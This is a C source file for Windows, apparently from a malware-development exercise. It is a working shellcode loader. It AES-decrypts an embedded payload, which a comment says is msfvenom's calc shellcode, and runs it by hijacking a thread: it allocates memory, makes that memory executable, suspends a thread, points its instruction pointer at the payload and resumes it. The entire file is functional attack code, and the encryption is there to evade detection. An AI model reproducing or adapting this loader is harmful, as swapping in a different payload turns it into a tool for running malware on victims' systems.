#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <bcrypt.h>
#pragma comment(lib, "Bcrypt.lib")

#define NT_SUCCESS(status)              (((NTSTATUS)(status)) >= 0)
#define KEYSIZE         32
#define IVSIZE          16

typedef struct _AES {
    PBYTE   pPlainText;             // base address of the plain text data
    DWORD   dwPlainSize;            // size of the plain text data
    PBYTE   pCipherText;            // base address of the encrypted data
    DWORD   dwCipherSize;           // size of it
    PBYTE   pKey;                   // the 32 byte key
    PBYTE   pIv;                    // the 16 byte iv
} AES, * PAES;

BOOL InstallAesDecryption(PAES pAes) {
    BOOL bSTATE = TRUE;
    BCRYPT_ALG_HANDLE hAlgorithm = NULL;
    BCRYPT_KEY_HANDLE hKeyHandle = NULL;
    ULONG cbResult = 0;
    DWORD dwBlockSize = 0;
    DWORD cbKeyObject = 0;
    PBYTE pbKeyObject = NULL;
    PBYTE pbPlainText = NULL;
    DWORD cbPlainText = 0;
    NTSTATUS STATUS = 0;

    STATUS = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptOpenAlgorithmProvider Failed: 0x%0.8X\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }

    STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptGetProperty[1] Failed: 0x%0.8X\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }

    STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptGetProperty[2] Failed: 0x%0.8X\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }

    if (dwBlockSize != 16) {
        printf("[!] Unexpected block size: %d\n", dwBlockSize);
        bSTATE = FALSE; goto _EndOfFunc;
    }

    pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
    if (pbKeyObject == NULL) {
        printf("[!] HeapAlloc for key object failed\n");
        bSTATE = FALSE; goto _EndOfFunc;
    }

    STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptSetProperty Failed: 0x%0.8X\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }

    STATUS = BCryptGenerateSymmetricKey(hAlgorithm, &hKeyHandle, pbKeyObject, cbKeyObject, (PBYTE)pAes->pKey, KEYSIZE, 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptGenerateSymmetricKey Failed: 0x%0.8X\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }

    STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, NULL, 0, &cbPlainText, BCRYPT_BLOCK_PADDING);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptDecrypt[1] Failed: 0x%0.8X\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }

    pbPlainText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbPlainText);
    if (pbPlainText == NULL) {
        printf("[!] HeapAlloc for plaintext failed\n");
        bSTATE = FALSE; goto _EndOfFunc;
    }

    STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, pbPlainText, cbPlainText, &cbResult, BCRYPT_BLOCK_PADDING);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptDecrypt[2] Failed: 0x%0.8X\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }

_EndOfFunc:
    if (hKeyHandle) BCryptDestroyKey(hKeyHandle);
    if (hAlgorithm) BCryptCloseAlgorithmProvider(hAlgorithm, 0);
    if (pbKeyObject) HeapFree(GetProcessHeap(), 0, pbKeyObject);
    if (pbPlainText != NULL && bSTATE) {
        pAes->pPlainText = pbPlainText;
        pAes->dwPlainSize = cbPlainText;
    }
    else if (pbPlainText) {
        HeapFree(GetProcessHeap(), 0, pbPlainText);
    }
    return bSTATE;
}

BOOL SimpleDecryption(IN PVOID pCipherTextData, IN DWORD sCipherTextSize, IN PBYTE pKey, IN PBYTE pIv, OUT PVOID* pPlainTextData, OUT DWORD* sPlainTextSize) {
    if (!pCipherTextData || !sCipherTextSize || !pKey || !pIv || !pPlainTextData || !sPlainTextSize) return FALSE;

    AES Aes = {
        .pKey = pKey,
        .pIv = pIv,
        .pCipherText = pCipherTextData,
        .dwCipherSize = sCipherTextSize
    };

    if (!InstallAesDecryption(&Aes)) return FALSE;

    *pPlainTextData = Aes.pPlainText;
    *sPlainTextSize = Aes.dwPlainSize;
    return TRUE;
}

// Enumerate threads
BOOL EnumThread(IN DWORD dwMainThreadId, OUT DWORD* dwThreadId, OUT HANDLE* hThread) {
    DWORD dwProcessId = GetCurrentProcessId();
    HANDLE hSnapShot = NULL;
    BOOL threadFound = FALSE;
    THREADENTRY32 Thr = { .dwSize = sizeof(THREADENTRY32) };

    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapShot == INVALID_HANDLE_VALUE) {
        printf("\n\t[!] CreateToolhelp32Snapshot Failed With Error: %d\n", GetLastError());
        goto _EndOfFunction;
    }

    if (!Thread32First(hSnapShot, &Thr)) {
        printf("\n\t[!] Thread32First Failed With Error: %d\n", GetLastError());
        goto _EndOfFunction;
    }

    do {
        if (Thr.th32OwnerProcessID == dwProcessId && Thr.th32ThreadID != dwMainThreadId) {
            printf("[i] Found candidate thread TID: %lu\n", Thr.th32ThreadID);
            *dwThreadId = Thr.th32ThreadID;
            *hThread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME | THREAD_QUERY_INFORMATION | SYNCHRONIZE, FALSE, Thr.th32ThreadID);
            if (*hThread == NULL) {
                printf("\n\t[!] OpenThread Failed With Error: %d\n", GetLastError());
                break;
            }
            // Verify thread is active
            DWORD exitCode;
            if (!GetExitCodeThread(*hThread, &exitCode) || exitCode != STILL_ACTIVE) {
                printf("[!] Thread is not active (ExitCode: %lu)\n", exitCode);
                CloseHandle(*hThread);
                *hThread = NULL;
                break;
            }
            threadFound = TRUE;
            break;
        }
    } while (Thread32Next(hSnapShot, &Thr));

_EndOfFunction:
    if (hSnapShot != NULL)
        CloseHandle(hSnapShot);
    return threadFound;
}

BOOL RunViaClassicThreadHijacking(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
    PVOID pAddress = NULL;
    DWORD dwOldProtection = 0;
    CONTEXT ThreadCtx = { .ContextFlags = CONTEXT_FULL };

    // Check if thread is active
    DWORD exitCode;
    if (!GetExitCodeThread(hThread, &exitCode) || exitCode != STILL_ACTIVE) {
        printf("[!] Thread is not active (ExitCode: %lu)\n", exitCode);
        return FALSE;
    }

    printf("\n[i] Allocating memory to the local process ...");
    pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pAddress == NULL) {
        printf("[!] VirtualAlloc Failed With Error: %d\n", GetLastError());
        return FALSE;
    }

    printf("\n\t [i] Allocated Memory at: 0x%p \n", pAddress);
    printf("\t [#] Press <Enter> to write payload ...");
    getchar();

    if (pPayload == NULL || sPayloadSize == 0) {
        printf("[!] Invalid payload or size\n");
        VirtualFree(pAddress, 0, MEM_RELEASE);
        return FALSE;
    }

    memcpy(pAddress, pPayload, sPayloadSize);

    if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtection)) {
        printf("[!] VirtualProtect Failed With Error: %d\n", GetLastError());
        VirtualFree(pAddress, 0, MEM_RELEASE);
        return FALSE;
    }

    printf("[+] Done!\n");

    printf("\n[i] Hijacking the target thread to run our shellcode ...");
   

    if (SuspendThread(hThread) == (DWORD)-1) {
        printf("[!] SuspendThread Failed With Error: %d\n", GetLastError());
        VirtualFree(pAddress, 0, MEM_RELEASE);
        return FALSE;
    }

    if (!GetThreadContext(hThread, &ThreadCtx)) {
        printf("[!] GetThreadContext Failed With Error: %d\n", GetLastError());
        ResumeThread(hThread);
        VirtualFree(pAddress, 0, MEM_RELEASE);
        return FALSE;
    }

    printf("\n[i] Original Rip: 0x%llx, New Rip: 0x%llx\n", ThreadCtx.Rip, (DWORD64)pAddress);
    ThreadCtx.Rip = (DWORD64)pAddress;
    // Ensure stack alignment (optional, adjust if needed)
    ThreadCtx.Rsp -= 8;

    if (!SetThreadContext(hThread, &ThreadCtx)) {
        printf("[!] SetThreadContext Failed With Error: %d\n", GetLastError());
        ResumeThread(hThread);
        VirtualFree(pAddress, 0, MEM_RELEASE);
        return FALSE;
    }

    printf("\n\t[#] Press <Enter> to run ...");
    getchar();
    if (ResumeThread(hThread) == (DWORD)-1) {
        printf("[!] ResumeThread Failed With Error: %d\n", GetLastError());
        VirtualFree(pAddress, 0, MEM_RELEASE);
        return FALSE;
    }

    WaitForSingleObject(hThread, INFINITE);

    return TRUE;
}

int main() {
    // Encrypted shellcode -> msfvenom's calc payload
    unsigned char AesCipherText[] = {
         0x10, 0x06, 0x33, 0x6F, 0x7E, 0x49, 0x79, 0x75, 0xDB, 0x80, 0x3E, 0x59, 0xB8, 0x22, 0xAA, 0x4A,
         0x61, 0x08, 0x86, 0x6F, 0x7A, 0x50, 0xCA, 0x95, 0xCF, 0xA4, 0x3C, 0x0B, 0x64, 0x5F, 0xC7, 0xBC,
         0x98, 0x2D, 0xD1, 0xB9, 0xEB, 0xF3, 0x49, 0xF1, 0xDC, 0x5A, 0x8F, 0x05, 0x41, 0x4F, 0x2C, 0x8E,
         0x13, 0x40, 0x90, 0xBE, 0x3B, 0x5B, 0xE1, 0x39, 0x42, 0x8A, 0xD6, 0x04, 0xF8, 0x90, 0x82, 0xAB,
         0x08, 0xAA, 0x03, 0x46, 0x3B, 0x43, 0x90, 0x09, 0x7F, 0x71, 0xC5, 0xF1, 0x5E, 0xB3, 0xF0, 0x31,
         0x56, 0x1C, 0xB1, 0x79, 0x71, 0x8B, 0x0F, 0xD4, 0xF2, 0x81, 0x4A, 0x64, 0xF6, 0x43, 0xC9, 0xB9,
         0xBD, 0xA6, 0xE7, 0x0C, 0xE8, 0xEC, 0x05, 0x18, 0x48, 0xB6, 0x1A, 0x02, 0xF6, 0xAA, 0x5B, 0xFD,
         0xE3, 0xC3, 0x13, 0xCA, 0x8D, 0x23, 0xCA, 0xFF, 0xC7, 0x54, 0x4D, 0x06, 0x29, 0xDE, 0xB2, 0x8E,
         0xB0, 0x96, 0x0C, 0x97, 0x0B, 0x07, 0x0F, 0xCA, 0x9E, 0x45, 0xCC, 0x7C, 0xE9, 0x8E, 0x5A, 0x2E,
         0x27, 0xBC, 0xC9, 0xBD, 0xC6, 0xFB, 0x15, 0xDB, 0xA8, 0x57, 0x3F, 0x2D, 0xD5, 0x58, 0xCB, 0xA6,
         0xA5, 0x97, 0x1C, 0xE7, 0xBD, 0xAF, 0xA4, 0x07, 0x15, 0x10, 0xB0, 0x1F, 0x80, 0x51, 0xB2, 0x26,
         0xF1, 0xF1, 0xCD, 0x8B, 0xF1, 0xA1, 0x99, 0xEC, 0x46, 0x12, 0xE0, 0xB4, 0x24, 0x4E, 0xC8, 0xBB,
         0x1F, 0x6E, 0x74, 0x0D, 0xCB, 0x96, 0x82, 0x3E, 0x3E, 0x47, 0x35, 0xA1, 0x44, 0x30, 0x71, 0xC1,
         0xC0, 0xA8, 0x49, 0xC4, 0x0A, 0x2D, 0xE5, 0xC1, 0xC2, 0x71, 0xF9, 0x16, 0x15, 0xCF, 0x58, 0x24,
         0xC9, 0x4F, 0x5C, 0x83, 0xF8, 0x68, 0x6D, 0xE6, 0xAF, 0x8C, 0x07, 0xBA, 0x1B, 0x2F, 0x07, 0x3B,
         0x90, 0xCF, 0x06, 0x5D, 0xE3, 0x81, 0x48, 0x46, 0x5B, 0x08, 0xFB, 0xF4, 0x17, 0xD1, 0x3C, 0x53,
         0xBE, 0x01, 0xF8, 0xFC, 0x08, 0x89, 0x04, 0x8C, 0x40, 0x4D, 0x9E, 0x89, 0x3B, 0x40, 0xF8, 0xC2,
         0x2D, 0xBD, 0xEE, 0xE1, 0xBB, 0x73, 0xD1, 0x93, 0x43, 0xED, 0x72, 0x0B, 0xB1, 0x4A, 0xFC, 0x11 };


    unsigned char AesKey[] = {
            0x89, 0xAA, 0x86, 0x27, 0xD6, 0x82, 0x03, 0xE2, 0x54, 0x41, 0x61, 0x3A, 0x35, 0x1D, 0x8C, 0xBA,
            0xEE, 0x8B, 0xB5, 0x23, 0x46, 0x05, 0x00, 0x57, 0xAD, 0x0B, 0x7D, 0x75, 0xD0, 0x68, 0x5A, 0x46 };


    unsigned char AesIv[] = {
            0x27, 0x1C, 0xA0, 0x97, 0x18, 0x95, 0x91, 0xF8, 0xA4, 0x2C, 0x60, 0x10, 0x09, 0x32, 0xE8, 0xE4 };

    // Initialize variables
    PVOID pPlainText = NULL;
    DWORD sPlainTextSize = 0;
    DWORD MainThreadId = GetCurrentThreadId();
    DWORD ThreadId = 0;
    HANDLE hThread = NULL;

    // Call EnumThread
    printf("[i] Searching For Threads ... \n");
    if (!EnumThread(MainThreadId, &ThreadId, &hThread)) {
        printf("\n\t[!] No secondary threads found, creating a new thread\n");
        // Create a new thread to execute the shellcode
        hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)NULL, NULL, CREATE_SUSPENDED, &ThreadId);
        if (hThread == NULL) {
            printf("\n\t[!] CreateThread Failed With Error: %d\n", GetLastError());
            return 1;
        }
    }
    printf("[+] Done!\n");

    // Print results
    printf("\n\t[i] Main TID: %lu\n", MainThreadId);
    printf("\n\t[i] Target TID: %lu\n", ThreadId);
    printf("\n\t[i] Thread Handle: %p\n", hThread);

    printf("\n[i] Decrypting Shellcode... \n");
    if (!SimpleDecryption(AesCipherText, sizeof(AesCipherText), AesKey, AesIv, &pPlainText, &sPlainTextSize)) {
        printf("\n\t[!] Shellcode Decryption Failed!\n");
        if (hThread != NULL) CloseHandle(hThread);
        return 1;
    }
    printf("[+] Done!\n");
    printf("\n[i] Decrypted shellcode size: %lu bytes\n", sPlainTextSize);
    printf("[i] First 8 bytes: %02X %02X %02X %02X %02X %02X %02X %02X\n",
        ((PBYTE)pPlainText)[0], ((PBYTE)pPlainText)[1], ((PBYTE)pPlainText)[2], ((PBYTE)pPlainText)[3],
        ((PBYTE)pPlainText)[4], ((PBYTE)pPlainText)[5], ((PBYTE)pPlainText)[6], ((PBYTE)pPlainText)[7]);


    if (!RunViaClassicThreadHijacking(hThread, pPlainText, sPlainTextSize)) {
        printf("[!] Thread Hijacking Failed ...\n");
        if (pPlainText != NULL) HeapFree(GetProcessHeap(), 0, pPlainText);
        if (hThread != NULL) CloseHandle(hThread);
        return 1;
    }

    // Clean up
    //if (pPlainText != NULL) HeapFree(GetProcessHeap(), 0, pPlainText);
    if (hThread != NULL) CloseHandle(hThread);

    return 0;
}
